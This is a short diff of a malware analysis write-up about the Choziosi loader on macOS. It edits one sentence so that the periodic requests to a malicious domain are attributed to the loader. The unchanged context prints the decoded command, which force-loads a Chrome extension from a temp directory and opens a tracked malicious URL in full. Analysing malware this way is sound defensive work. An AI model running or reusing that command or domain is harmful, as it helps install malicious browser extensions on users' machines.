@@ -114,7 +114,7 @@ Decoded Base64 string
 open -na 'Google Chrome' --args -load-extension='/private/var/tmp/D018DB95-ABAB-444F-87DC-13D8F9DAF25F' --new-window 'https://ationwindon.com/?tid=949115&optid=913393&cook=599881554480138044&agec=1650725231';
 ```
 
-Based on the above information, we can see that 3 seperate bash commands are executed which loads a ChromeExtension stored in the `tmp` directory.  Based on this sample we can see that extension `D018DB95-ABAB-444F-87DC-13D8F9DAF25F` is loaded.  Also one of the extension contains a mal url (https[:]//ationwindon[.]com/?tid=949115&optid=913393&cook=599881554480138044&agec=1650725231) where the domain periodically makes requests.
+Based on the above information, we can see that 3 seperate bash commands are executed which loads a ChromeExtension stored in the `tmp` directory.  Based on this sample we can see that extension `D018DB95-ABAB-444F-87DC-13D8F9DAF25F` is loaded.  Also one of the extension contains a mal url (https[:]//ationwindon[.]com/?tid=949115&optid=913393&cook=599881554480138044&agec=1650725231).  The Choziosi loader periodically makes requests to this mal url.
 
 Extension contents
 
